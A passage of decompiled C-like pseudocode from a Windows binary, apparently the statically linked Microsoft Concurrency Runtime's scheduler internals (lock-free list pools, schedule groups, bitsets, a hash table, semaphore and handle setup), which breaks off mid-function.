int __thiscall sub_450A82(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3)
{
  PSLIST_ENTRY v3; // eax
  int v4; // edx
  _DWORD *v5; // eax

  v3 = InterlockedPopEntrySList(this + 63);
  v4 = v3 != 0 ? (unsigned int)&v3[-3] : 0;
  if ( v4 )
  {
    (v3 != 0 ? &v3[-2] : (struct _SINGLE_LIST_ENTRY *)4)->Next = a2;
    (v3 != 0 ? &v3[-1] : (struct _SINGLE_LIST_ENTRY *)8)->Next = a3;
    goto LABEL_6;
  }
  v5 = operator new(0x10u);
  v4 = (int)v5;
  if ( v5 )
  {
    v5[1] = a2;
    *v5 = &Concurrency::details::RealizedChore::`vftable';
    v5[2] = a3;
LABEL_6:
    *(_DWORD *)(v4 + 12) = 0;
    return v4;
  }
  return 0;
}
// 493AAC: using guessed type void *Concurrency::details::RealizedChore::`vftable';

//----- (00450ADF) --------------------------------------------------------
int __thiscall sub_450ADF(union _SLIST_HEADER *this)
{
  PSLIST_ENTRY v1; // eax

  v1 = InterlockedPopEntrySList(this + 64);
  return v1 != 0 ? (unsigned int)&v1[-2] : 0;
}

//----- (00450AF6) --------------------------------------------------------
int __thiscall sub_450AF6(int *this)
{
  int *v1; // ecx

  v1 = this + 74;
  if ( *v1 )
    return sub_4500FF(v1);
  else
    return 0;
}

//----- (00450B09) --------------------------------------------------------
PSLIST_ENTRY __cdecl sub_450B09(char a1)
{
  PSLIST_ENTRY v2; // esi

  if ( a1 )
  {
    if ( dword_500044 >= 32 )
      return 0;
    _InterlockedIncrement(&dword_500044);
  }
  v2 = InterlockedPopEntrySList(&ListHead);
  if ( !v2 )
  {
    v2 = (PSLIST_ENTRY)operator new(0x308u);
    if ( v2 )
    {
      `eh vector constructor iterator'(
        &v2[1],
        8u,
        0x60u,
        (void (__thiscall *)(void *))sub_458136,
        (void (__thiscall *)(void *))sub_45814B);
      LOBYTE(v2[193].Next) = 0;
    }
    else
    {
      v2 = 0;
    }
  }
  LOBYTE(v2[193].Next) = a1;
  return v2;
}
// 500044: using guessed type int dword_500044;

//----- (00450B89) --------------------------------------------------------
int __thiscall sub_450B89(_DWORD *this, int a2)
{
  if ( *(_DWORD *)(*(_DWORD *)(this[9] + 4 * a2) + 188) )
    return a2;
  else
    return sub_450A15(this, a2);
}

//----- (00450BAC) --------------------------------------------------------
void __thiscall sub_450BAC(void *this, int a2)
{
  int v2; // ebx
  int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // ecx
  int v7; // [esp+8h] [ebp-4h]

  v2 = a2;
  if ( a2 != *(_DWORD *)this )
  {
    v4 = unknown_libname_86((unsigned __int64)((unsigned int)(a2 + 31) >> 5) >> 30 != 0 ? -1 : 4
                                                                                             * ((unsigned int)(a2 + 31) >> 5));
    v5 = 0;
    v7 = v4;
    v6 = (unsigned int)(*(_DWORD *)this + 31) >> 5;
    if ( v6 )
    {
      do
      {
        *(_DWORD *)(v4 + 4 * v5) = *(_DWORD *)(*((_DWORD *)this + 1) + 4 * v5);
        ++v5;
      }
      while ( v5 < v6 );
      v2 = a2;
    }
    memset((void *)(v4 + 4 * v6), 0, 4 * (((unsigned int)(a2 + 31) >> 5) - v6));
    j_j__free(*((void **)this + 1));
    *((_DWORD *)this + 1) = v7;
    *(_DWORD *)this = v2;
  }
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00450C2B) --------------------------------------------------------
void __thiscall sub_450C2B(void **this, int a2)
{
  unsigned int v3; // ebx
  int v4; // edx
  unsigned int v5; // ecx
  void *i; // [esp+Ch] [ebp-4h]

  v3 = (unsigned int)*this;
  if ( (void *)a2 != *this )
  {
    sub_450BAC(this, a2);
    v4 = unknown_libname_86((unsigned __int64)(unsigned int)a2 >> 30 != 0 ? -1 : 4 * a2);
    v5 = 0;
    for ( i = (void *)v4; v5 < v3; ++v5 )
      *(_DWORD *)(v4 + 4 * v5) = *((_DWORD *)this[2] + v5);
    memset((void *)(v4 + 4 * v3), 0, 4 * (a2 - v3));
    j_j__free(this[2]);
    this[2] = i;
  }
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (00450C9C) --------------------------------------------------------
bool __thiscall sub_450C9C(_DWORD *this)
{
  return (this[101] & 0xA0000000) == -1610612736;
}

//----- (00450CAF) --------------------------------------------------------
int __cdecl sub_450CAF(int a1, unsigned int a2)
{
  unsigned int v2; // edx
  unsigned int i; // ecx

  v2 = -2128831035;
  for ( i = 0; i < 4; ++i )
    v2 = 16777619 * (v2 ^ *(unsigned __int8 *)(i + a1));
  return v2 % a2;
}

//----- (00450CDB) --------------------------------------------------------
int __thiscall sub_450CDB(_DWORD *this)
{
  return this[93];
}

//----- (00450CE2) --------------------------------------------------------
int __thiscall sub_450CE2(_DWORD *this)
{
  int v1; // ebx
  _DWORD *v2; // edi
  unsigned int v3; // esi
  int v4; // ecx
  unsigned int *v5; // eax
  unsigned int v6; // eax
  int v7; // eax
  int v8; // esi
  int v9; // edi
  _DWORD *v10; // esi
  unsigned int v11; // edi
  int v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // ecx
  unsigned int v16; // edi
  char v17; // si
  int v18; // edx
  int (__thiscall **v19)(int *); // eax
  union _SLIST_HEADER *v20; // eax
  int *v21; // esi
  void *v22; // eax
  char *v23; // eax
  bool v24; // zf
  int v25; // edi
  unsigned int *v26; // ebx
  unsigned int v27; // edx
  void *v28; // ecx
  int v29; // eax
  int v30; // esi
  unsigned int v31; // esi
  int v32; // eax
  unsigned int v33; // ecx
  int v34; // ebx
  int (__thiscall *v35)(int, int, int); // edi
  int v36; // eax
  void (__thiscall ***v37)(_DWORD, _DWORD); // eax
  _DWORD *v38; // ebx
  int Semaphore; // eax
  int LastError; // eax
  Concurrency::details::platform *v42; // [esp+0h] [ebp-74h]
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-64h] BYREF
  int v44; // [esp+20h] [ebp-54h] BYREF
  void *Block; // [esp+24h] [ebp-50h]
  void *v46; // [esp+28h] [ebp-4Ch]
  void *v47; // [esp+2Ch] [ebp-48h]
  int v48; // [esp+30h] [ebp-44h] BYREF
  unsigned int v49; // [esp+34h] [ebp-40h] BYREF
  char *v50; // [esp+38h] [ebp-3Ch]
  void *v51; // [esp+3Ch] [ebp-38h]
  unsigned int v52; // [esp+40h] [ebp-34h]
  int *v53; // [esp+44h] [ebp-30h]
  unsigned int v54; // [esp+48h] [ebp-2Ch] BYREF
  int v55; // [esp+4Ch] [ebp-28h] BYREF
  int i; // [esp+50h] [ebp-24h]
  _DWORD *v57; // [esp+54h] [ebp-20h]
  unsigned int v58; // [esp+58h] [ebp-1Ch] BYREF
  int *v59; // [esp+5Ch] [ebp-18h]
  unsigned int v60; // [esp+60h] [ebp-14h]
  _DWORD *v61; // [esp+64h] [ebp-10h]
  int v62; // [esp+70h] [ebp-4h]

  v1 = (int)this;
  v57 = this;
  v2 = 0;
  this[109] = 0;
  this[5] = 0;
  this[11] = 0;
  this[106] = sub_44B7B9();
  *(_DWORD *)(v1 + 372) = Concurrency::details::platform::GetNextAsyncId(v42);
  *(_DWORD *)(v1 + 44) = sub_44CE98();
  v3 = sub_44A8B3() + 1;
  *(_DWORD *)(v1 + 40) = v3;
  v50 = (char *)v3;
  v4 = (unsigned __int64)v3 >> 28 != 0 ? -1 : 16 * v3;
  v5 = (unsigned int *)unknown_libname_86(__CFADD__(v4, 4) ? -1 : v4 + 4);
  v51 = v5;
  v62 = 0;
  if ( v5 )
  {
    v2 = v5 + 1;
    *v5 = v3;
    `eh vector constructor iterator'(
      v5 + 1,
      0x10u,
      v3,
      (void (__thiscall *)(void *))sub_44EFB1,
      (void (__thiscall *)(void *))sub_44F472);
  }
  v6 = *(_DWORD *)(v1 + 44);
  v62 = -1;
  *(_DWORD *)(v1 + 28) = v2;
  *(_DWORD *)(v1 + 36) = unknown_libname_86((unsigned __int64)v6 >> 30 != 0 ? -1 : 4 * v6);
  *(_DWORD *)(v1 + 32) = unknown_libname_86((unsigned __int64)*(unsigned int *)(v1 + 44) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(v1 + 44));
  memset(*(void **)(v1 + 36), 0, 4 * *(_DWORD *)(v1 + 44));
  memset(*(void **)(v1 + 32), 0, 4 * *(_DWORD *)(v1 + 44));
  v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 36))(v1);
  v8 = 0;
  *(_DWORD *)(v1 + 176) = v7;
  v60 = 0;
  v54 = 0;
  *(_BYTE *)(v7 + 48) |= 4u;
  v9 = 0;
  for ( i = sub_44CE93(); v9 < *(_DWORD *)(v1 + 40); v8 += 16 )
  {
    sub_450BAC((void *)(v8 + *(_DWORD *)(v1 + 28)), *(_DWORD *)(v1 + 44));
    sub_450BAC((void *)(v8 + *(_DWORD *)(v1 + 28) + 8), i);
    ++v9;
  }
  v10 = (_DWORD *)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 424) + 16))(*(_DWORD *)(v1 + 424));
  v61 = v10;
  if ( v10 )
  {
    v11 = v60;
    do
    {
      sub_44EFC9(&v44, i);
      v12 = *v10;
      v62 = 1;
      v58 = (*(int (__thiscall **)(_DWORD *))(v12 + 4))(v61);
      v13 = (*(int (__thiscall **)(_DWORD *))(*v61 + 8))(v61);
      v14 = *(_DWORD *)(v1 + 28);
      v50 = (char *)v13;
      v51 = (void *)(16 * v13);
      v52 = v11;
      *(_DWORD *)(*(_DWORD *)(v14 + 16 * v13 + 4) + 4 * (v58 >> 5)) |= 1 << (v58 & 0x1F);
      v53 = (int *)(*(int (__thiscall **)(_DWORD *))(*v61 + 16))(v61);
      v15 = (int)v53;
      v59 = v53;
      if ( v53 )
      {
        do
        {
          v55 = (*(int (__thiscall **)(int *))(*(_DWORD *)v15 + 4))(v59);
          sub_45119C((unsigned int *)(v1 + 348), &v55, &v58);
          sub_45119C((unsigned int *)(v1 + 360), &v55, &v54);
          v16 = v11 >> 5;
          v17 = v60 & 0x1F;
          *((_DWORD *)Block + v16) |= 1 << (v60 & 0x1F);
          v18 = *(_DWORD *)((char *)v51 + *(_DWORD *)(v1 + 28) + 12);
          *(_DWORD *)(v18 + 4 * v16) |= 1 << v17;
          v11 = v60 + 1;
          v60 = v11;
          v19 = (int (__thiscall **)(int *))*v59;
          v54 = v11;
          v15 = (*v19)(v59);
          v59 = (int *)v15;
        }
        while ( v15 );
      }
      v20 = (union _SLIST_HEADER *)operator new(0xC0u);
      v47 = v20;
      LOBYTE(v62) = 2;
      if ( v20 )
      {
        v21 = (int *)sub_4598ED(v20, v1, (struct _SINGLE_LIST_ENTRY *)v58);
        v59 = v21;
      }
      else
      {
        v21 = 0;
        v59 = 0;
      }
      LOBYTE(v62) = 1;
      v22 = operator new(0x88u);
      v46 = v22;
      LOBYTE(v62) = 3;
      if ( v22 )
        v23 = sub_457B39((char *)v22, (int)&v44, (int)v50, v21);
      else
        v23 = 0;
      v24 = v53 == 0;
      v51 = v23;
      LOBYTE(v62) = 1;
      v21[1] = (int)v23;
      if ( !v24 )
      {
        v25 = (int)v53;
        v50 = v23 + 16;
        v26 = (unsigned int *)(v23 + 16);
        do
        {
          v49 = v52++;
          v48 = (*(int (__thiscall **)(int))(*(_DWORD *)v25 + 4))(v25);
          sub_45119C(v26, &v48, &v49);
          v25 = (**(int (__thiscall ***)(int))v25)(v25);
        }
        while ( v25 );
        v1 = (int)v57;
        v11 = v60;
        v21 = v59;
      }
      v27 = v58;
      v28 = v51;
      *(_DWORD *)(*(_DWORD *)(v1 + 36) + 4 * v58) = v21;
      *(_DWORD *)(*(_DWORD *)(v1 + 32) + 4 * v27) = v28;
      v29 = (*(int (__thiscall **)(_DWORD *))*v61)(v61);
      v62 = -1;
      v10 = (_DWORD *)v29;
      v61 = (_DWORD *)v29;
      j_j__free(Block);
    }
    while ( v10 );
  }
  v30 = v60;
  sub_450C2B((void **)(v1 + 60), v60);
  sub_450C2B((void **)(v1 + 72), v30);
  sub_450BAC((void *)(v1 + 84), v30);
  sub_450C2B((void **)(v1 + 48), v30);
  v31 = 32 * v30;
  v32 = unknown_libname_86((unsigned __int64)v31 >> 30 != 0 ? -1 : 4 * v31);
  v33 = 0;
  for ( *(_DWORD *)(v1 + 92) = v32; v33 < v31; ++v33 )
    *(_DWORD *)(*(_DWORD *)(v1 + 92) + 4 * v33) = 0;
  v34 = *(_DWORD *)(v1 + 424);
  v35 = *(int (__thiscall **)(int, int, int))(*(_DWORD *)v34 + 8);
  v36 = (*(int (__thiscall **)(_DWORD *))(*v57 + 52))(v57);
  v37 = (void (__thiscall ***)(_DWORD, _DWORD))v35(v34, v36, 0x10000);
  v38 = v57;
  v57[107] = v37;
  (**v37)(v37, 0);
  v38[94] = sub_450B89(v38, 0);
  Semaphore = __crtCreateSemaphoreExW(0, 0, 0x7FFFFFFF, 0, 0, 2031619);
  v38[95] = Semaphore;
  if ( !Semaphore )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  (*(void (__thiscall **)(_DWORD *))(*v38 + 76))(v38);
  return sub_45269A(1, 4u, v38[93]);
}
// 450D0C: variable 'v42' is possibly undefined
// 434756: using guessed type _DWORD __cdecl __crtCreateSemaphoreExW(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 44CE98: using guessed type int sub_44CE98(void);
// 450CE2: using guessed type _DWORD pExceptionObject[4];

//----- (00451194) --------------------------------------------------------
void __thiscall sub_451194(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 98);
}

//----- (0045119C) --------------------------------------------------------
_DWORD *__thiscall sub_45119C(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // ebx
  _DWORD *v5; // eax
  _DWORD *v6; // edx
  _DWORD *result; // eax

  v4 = sub_450CAF((int)a2, *this);
  if ( sub_451410(this, a2, v4) )
    return 0;
  v5 = operator new(0xCu);
  v6 = v5;
  if ( v5 )
  {
    *v5 = 0;
    v5[1] = *a2;
    v5[2] = *a3;
  }
  else
  {
    v6 = 0;
  }
  result = v6;
  *v6 = *(_DWORD *)(this[2] + 4 * v4);
  *(_DWORD *)(this[2] + 4 * v4) = v6;
  ++this[1];
  return result;
}

//----- (00451204) --------------------------------------------------------
int *__thiscall sub_451204(int this, _DWORD *a2)
{
  _DWORD *v3; // ebx
  PSLIST_ENTRY v4; // eax
  int *v5; // esi
  int *v6; // eax
  int v8[4]; // [esp+10h] [ebp-20h] BYREF
  void *Block; // [esp+20h] [ebp-10h]
  int v10; // [esp+2Ch] [ebp-4h]

  v3 = (_DWORD *)(this + 96);
  v4 = InterlockedPopEntrySList((PSLIST_HEADER)(this + 96));
  v5 = 0;
  if ( v4 )
    v5 = (int *)&v4[-13];
  if ( *(_DWORD *)(this + 12) )
  {
    memset(v8, 0, sizeof(v8));
    if ( v5 )
    {
      sub_45A7DC(v5, v8);
      goto LABEL_14;
    }
    v5 = (int *)operator new(0x3Cu);
    Block = v5;
    v10 = 1;
    if ( v5 )
    {
      sub_459C18((int)v5, this, v8);
      v5[14] = 0;
      *v5 = (int)&Concurrency::details::FairScheduleGroup::`vftable';
      *((_BYTE *)v5 + 48) = 2;
      goto LABEL_12;
    }
LABEL_11:
    v5 = 0;
    goto LABEL_12;
  }
  if ( !v5 )
  {
    v6 = (int *)operator new(0x38u);
    v5 = v6;
    Block = v6;
    v10 = 0;
    if ( v6 )
    {
      sub_459C18((int)v6, this, a2);
      *v5 = (int)&Concurrency::details::CacheLocalScheduleGroup::`vftable';
      *((_BYTE *)v5 + 48) = 1;
LABEL_12:
      v10 = -1;
      goto LABEL_14;
    }
    goto LABEL_11;
  }
  sub_45A7DC(v5, a2);
LABEL_14:
  sub_44F7F0(v3, (signed __int32)v5);
  return v5;
}
// 493B2C: using guessed type void *Concurrency::details::CacheLocalScheduleGroup::`vftable';
// 493B6C: using guessed type void *Concurrency::details::FairScheduleGroup::`vftable';

//----- (004512CA) --------------------------------------------------------
signed __int32 __thiscall sub_4512CA(void *this)
{
  signed __int32 v2; // ebx

  if ( (*((_BYTE *)this + 48) & 4) != 0 )
    return 0;
  v2 = _InterlockedDecrement((volatile signed __int32 *)this + 5);
  if ( !v2 )
  {
    (*(void (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
    sub_451E86(*((union _SLIST_HEADER **)this + 1), (int)this);
  }
  return v2;
}

//----- (00451304) --------------------------------------------------------
bool __thiscall sub_451304(_DWORD *this, int a2)
{
  int v2; // eax
  unsigned int v3; // esi
  unsigned int v4; // edx

  v2 = 0;
  v3 = 0;
  v4 = (unsigned int)(*this + 31) >> 5;
  if ( v4 )
  {
    do
    {
      if ( v2 )
        break;
      v2 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v3) & *(_DWORD *)(this[1] + 4 * v3);
      ++v3;
    }
    while ( v3 < v4 );
  }
  return v2 != 0;
}

//----- (00451340) --------------------------------------------------------
int __thiscall sub_451340(int (__cdecl **this)(int), int (__cdecl *a2)(int), int (__cdecl *a3)(int), int a4)
{
  if ( (*(_DWORD *)(a4 + 404) & 0x20000000) != 0 )
    return a2((int)a3);
  *this = a2;
  this[1] = a3;
  return sub_45137C(a4, (int)this);
}

//----- (0045137C) --------------------------------------------------------
int __thiscall sub_45137C(int this, int a2)
{
  _DWORD *v3; // edi

  v3 = (_DWORD *)(this + 324);
  sub_44AE12((volatile __int32 *)(this + 324));
  *(_DWORD *)(a2 + 8) = sub_4517EB((volatile signed __int32 *)this);
  *(_DWORD *)(a2 + 12) = 0;
  **(_DWORD **)(this + 320) = a2;
  *(_DWORD *)(this + 320) = a2 + 12;
  return sub_44AE53(v3);
}

//----- (004513C0) --------------------------------------------------------
char __thiscall sub_4513C0(_DWORD *this)
{
  char v1; // dl

  v1 = 0;
  if ( this[6] || this[2] != this[4] || this[3] != this[5] )
    return 1;
  return v1;
}

//----- (004513DC) --------------------------------------------------------
bool __thiscall sub_4513DC(unsigned int *this, _DWORD *a2)
{
  bool v3; // bl
  void *v5[2]; // [esp+8h] [ebp-8h] BYREF

  sub_45065D(this, v5, a2);
  v3 = sub_451304(v5, (int)(this + 12));
  j_j__free(v5[1]);
  return v3;
}

//----- (00451410) --------------------------------------------------------
_DWORD *__thiscall sub_451410(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v3; // ecx

  v3 = *(_DWORD **)(this[2] + 4 * a3);
  if ( !v3 )
    return 0;
  while ( v3[1] != *a2 )
  {
    v3 = (_DWORD *)*v3;
    if ( !v3 )
      return 0;
  }
  return v3;
}

//----- (0045143A) --------------------------------------------------------
_DWORD *__stdcall sub_45143A(_DWORD *a1, int a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 0;
  a1[1] = 0;
  return result;
}

//----- (0045144B) --------------------------------------------------------
char __thiscall sub_45144B(_DWORD *this, _DWORD *a2)
{
  if ( *a2 == this[84] )
    return 0;
  *a2 = this[84];
  return 1;
}

//----- (0045146D) --------------------------------------------------------
char __thiscall sub_45146D(int this, struct _SINGLE_LIST_ENTRY *a2)
{
  __int32 v4[3]; // [esp+8h] [ebp-Ch] BYREF

  v4[0] = 0;
  if ( sub_450458((unsigned int *)this, v4, 0, 0, 0, 0, 12) )
  {
    if ( v4[0] == 2 || v4[0] == 8 )
    {
      InterlockedPushEntrySList((PSLIST_HEADER)(this + 512), a2 + 2);
      sub_4571AD((_DWORD **)v4[1], v4[0], 0, 0);
    }
    else
    {
      sub_45723E((int)v4, a2);
    }
    return 1;
  }
  else
  {
    InterlockedPushEntrySList((PSLIST_HEADER)(this + 512), a2 + 2);
    return 0;
  }
}

//----- (004514F5) --------------------------------------------------------
DWORD sub_4514F5()
{
  sub_44A317();
  dword_500038 = sub_44AA78();
  return sub_45B876();
}
// 44A317: using guessed type int sub_44A317(void);

//----- (00451509) --------------------------------------------------------
BOOL sub_451509()
{
  BOOL result; // eax

  sub_45B8B8();
  result = sub_44AAB5(dword_500038);
  dword_500038 = 0;
  return result;
}

//----- (00451522) --------------------------------------------------------
void __thiscall sub_451522(_DWORD *this, signed __int64 a2)
{
  volatile signed __int64 *v2; // edi
  unsigned int v3; // esi
  signed __int64 v4; // rax
  _DWORD *v5; // edi
  signed int v6; // esi
  _DWORD *v7; // ebx
  int v8; // eax
  int v9; // eax
  _DWORD *v10; // ebx
  int v11; // eax
  volatile signed __int32 *v12; // [esp+Ch] [ebp-14h]
  int v13; // [esp+10h] [ebp-10h] BYREF
  _DWORD *v14; // [esp+14h] [ebp-Ch]
  int v15; // [esp+18h] [ebp-8h] BYREF
  unsigned int v16; // [esp+1Ch] [ebp-4h]

  v14 = this;
  v2 = (volatile signed __int64 *)(this + 104);
  do
  {
    v3 = *(_DWORD *)v2;
    LODWORD(v4) = *(_DWORD *)v2;
    v16 = this[105];
    HIDWORD(v4) = v16;
  }
  while ( _InterlockedCompareExchange64(v2, a2, v4) != __PAIR64__(v16, v3) );
  v5 = v14;
  v12 = v14 + 77;
  sub_44A220(v14 + 77);
  v6 = 0;
  v16 = 0;
  if ( (int)v14[11] > 0 )
  {
    do
    {
      v7 = *(_DWORD **)(v5[9] + 4 * v6);
      v14 = *(_DWORD **)(v5[8] + 4 * v6);
      v8 = sub_4503FE(0, v7[20], &v15, v7 + 4);
      if ( v8 )
      {
        do
        {
          if ( (unsigned int)(a2 - *(_DWORD *)(v8 + 264)) > 0x7D0 && *(_DWORD *)(v8 + 284) == 1 )
          {
            *(_DWORD *)(v8 + 284) = 2;
            sub_44F97D(v5 + 76, v8 + 272);
          }
          v8 = sub_45098F(&v15, 0, v7 + 4);
        }
        while ( v8 );
        v6 = v16;
      }
      v9 = sub_4503FE(0, v7[40], &v15, v7 + 24);
      if ( v9 )
      {
        do
        {
          if ( (unsigned int)(a2 - *(_DWORD *)(v9 + 264)) > 0x7D0 && *(_DWORD *)(v9 + 284) == 1 )
          {
            *(_DWORD *)(v9 + 284) = 2;
            sub_44F97D(v5 + 76, v9 + 272);
          }
          v9 = sub_45098F(&v15, 0, v7 + 24);
        }
        while ( v9 );
        v6 = v16;
      }
      v10 = v14;
      v11 = sub_450429(v14, 0, v14[30], &v13);
      if ( v11 )
      {
        do
        {
          if ( (unsigned int)(a2 - *(_DWORD *)(v11 + 200)) > 0x7D0 && *(_DWORD *)(v11 + 224) == 1 )
          {
            *(_DWORD *)(v11 + 224) = 2;
            sub_44F97D(v5 + 76, v11 + 212);
          }
          v11 = sub_450A37(v10, &v13, 0);
        }
        while ( v11 );
        v6 = v16;
      }
      v16 = ++v6;
    }
    while ( v6 < v5[11] );
  }
  sub_44A33A(v12);
}

//----- (004516D8) --------------------------------------------------------
int __thiscall sub_4516D8(int this)
{
  signed __int32 v2; // edx
  signed __int32 v3; // ecx
  signed __int32 i; // eax

  if ( dword_500030 == this )
  {
    sub_44AE22(&dword_50005C);
    dword_500030 = this != dword_500030 ? dword_500030 : 0;
    dword_50005C = 0;
  }
  if ( *(int *)(this + 392) > 1 )
  {
    v2 = *(_DWORD *)(this + 404);
    v3 = v2;
    for ( i = v2; ; v3 = i )
    {
      i = _InterlockedCompareExchange((volatile signed __int32 *)(this + 404), v3 | 0x80000000, i);
      if ( i == v2 )
        break;
      v2 = i;
    }
    if ( (v2 & 0x1FFFFFFF) == 0 )
      sub_44FBE5((volatile signed __int32 *)this);
  }
  return sub_450091(this);
}
// 500030: using guessed type int dword_500030;
// 50005C: using guessed type int dword_50005C;

//----- (0045174E) --------------------------------------------------------
int __thiscall sub_45174E(int this)
{
  _BYTE *v2; // eax
  char v3; // bl
  signed __int32 v4; // eax
  signed __int32 v5; // edx
  int result; // eax

  v2 = sub_44AAC3(dword_500038);
  if ( v2 && !v2[76] && sub_43E90F(v2) == this )
  {
    v3 = 0;
  }
  else
  {
    v3 = 1;
    _InterlockedIncrement((volatile signed __int32 *)(this + 392));
  }
  sub_44FEB0((int *)this, 0);
  (*(void (__thiscall **)(int))(*(_DWORD *)this + 84))(this);
  v4 = *(_DWORD *)(this + 404);
  do
  {
    v5 = v4;
    v4 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 404), v4 & 0x9FFFFFFF | 0x20000000, v4);
  }
  while ( v4 != v5 );
  sub_451B88((HANDLE *)this, v4 & 0x1FFFFFFF);
  result = (*(int (__thiscall **)(int))(*(_DWORD *)this + 80))(this);
  if ( v3 )
    return sub_450091(this);
  return result;
}

//----- (004517EB) --------------------------------------------------------
signed __int32 __thiscall sub_4517EB(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // ecx
  signed __int32 result; // eax

  v1 = this + 84;
  do
  {
    do
      result = _InterlockedIncrement(v1);
    while ( !result );
  }
  while ( result == -1 );
  return result;
}

//----- (00451803) --------------------------------------------------------
signed __int32 __thiscall sub_451803(volatile signed __int32 *this, volatile signed __int32 *a2)
{
  signed __int32 v2; // esi
  signed __int32 result; // eax

  do
  {
    v2 = *this;
    *a2 = *this;
    result = _InterlockedCompareExchange(this, (signed __int32)a2, v2);
  }
  while ( result != v2 );
  return result;
}

//----- (00451821) --------------------------------------------------------
char __thiscall sub_451821(unsigned int *this, struct _SINGLE_LIST_ENTRY *a2, int a3, int a4, int a5, int a6)
{
  char v6; // bl
  int v8[4]; // [esp-14h] [ebp-30h] BYREF
  int v9; // [esp-4h] [ebp-20h]
  __int32 v10[3]; // [esp+Ch] [ebp-10h] BYREF
  unsigned int *v11; // [esp+18h] [ebp-4h]

  v11 = this;
  v6 = 0;
  if ( sub_44AAC3(dword_500038) != (LPVOID)(a2 != 0 ? (unsigned int)&a2[1] : 0) )
  {
    sub_4538D4();
    v9 = 5;
    v10[0] = 0;
    sub_452901(v8, &a3);
    if ( sub_450458(v11, v10, v8[0], v8[1], v8[2], v8[3], v9) )
    {
      sub_45723E((int)v10, a2);
      v6 = 1;
    }
    sub_4538D4();
  }
  return v6;
}
// 4538D4: using guessed type int sub_4538D4(void);

//----- (0045188E) --------------------------------------------------------
int __thiscall sub_45188E(void **this, void *a2)
{
  int result; // eax

  j_j__free(this[1]);
  *this = a2;
  result = unknown_libname_86((unsigned __int64)(((unsigned int)a2 + 31) >> 5) >> 30 != 0 ? -1 : 4
                                                                                               * (((unsigned int)a2 + 31) >> 5));
  this[1] = (void *)result;
  return result;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (004518C5) --------------------------------------------------------
signed __int32 __thiscall sub_4518C5(int this)
{
  signed __int32 result; // eax

  result = 0;
  if ( (*(_BYTE *)(this + 48) & 4) == 0 )
    return _InterlockedIncrement((volatile signed __int32 *)(this + 20));
  return result;
}

//----- (004518D5) --------------------------------------------------------
signed __int32 __thiscall sub_4518D5(volatile signed __int32 *this)
{
  signed __int32 v2; // edi
  volatile __int32 *v3; // ecx
  _BYTE *v4; // eax
  char pExceptionObject[12]; // [esp+8h] [ebp-Ch] BYREF

  v2 = _InterlockedIncrement(this + 96);
  if ( v2 == 1 )
  {
    v3 = this + 99;
    if ( *((int *)this + 99) <= 0 )
    {
      _InterlockedExchange(v3, 1);
    }
    else
    {
      v4 = sub_44AAC3(dword_500038);
      if ( !v4 || v4[76] || (volatile signed __int32 *)sub_43E90F(v4) != this )
      {
        std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVimproper_scheduler_reference_Concurrency__);
      }
      sub_451F9C(this);
    }
  }
  return v2;
}

//----- (00451945) --------------------------------------------------------
int __thiscall sub_451945(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 97);
  return (*(int (__thiscall **)(volatile signed __int32 *))(*this + 16))(this);
}

//----- (00451964) --------------------------------------------------------
void __thiscall sub_451964(volatile signed __int32 *this, HANDLE hSourceHandle)
{
  HANDLE CurrentProcess; // esi
  HANDLE v4; // eax
  _DWORD *v5; // eax
  int LastError; // eax
  int v7; // [esp+4h] [ebp-14h] BYREF
  char pExceptionObject[12]; // [esp+8h] [ebp-10h] BYREF
  HANDLE TargetHandle; // [esp+14h] [ebp-4h] BYREF

  if ( !hSourceHandle || hSourceHandle == (HANDLE)-1 )
  {
    sub_42E473(pExceptionObject, (int)"eventObject");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  TargetHandle = 0;
  CurrentProcess = GetCurrentProcess();
  v4 = GetCurrentProcess();
  if ( !DuplicateHandle(v4, hSourceHandle, CurrentProcess, &TargetHandle, 0, 0, 2u) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(&v7, LastError);
    _CxxThrowException(&v7, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  v5 = operator new(0xCu);
  v5[2] = TargetHandle;
  sub_44F9DE(this + 46, v5);
}

//----- (00451A0B) --------------------------------------------------------
signed __int32 __thiscall sub_451A0B(volatile signed __int32 *this)
{
  signed __int32 v1; // esi

  v1 = _InterlockedDecrement(this + 96);
  if ( !v1 )
    sub_4516D8((int)this);
  return v1;
}

//----- (00451A23) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_451A23(int this, struct _SINGLE_LIST_ENTRY *a2)
{
  union _SLIST_HEADER *v2; // edi

  v2 = (union _SLIST_HEADER *)(this + 496);
  if ( QueryDepthSList((PSLIST_HEADER)(this + 496)) >= *(int *)(this + 20) )
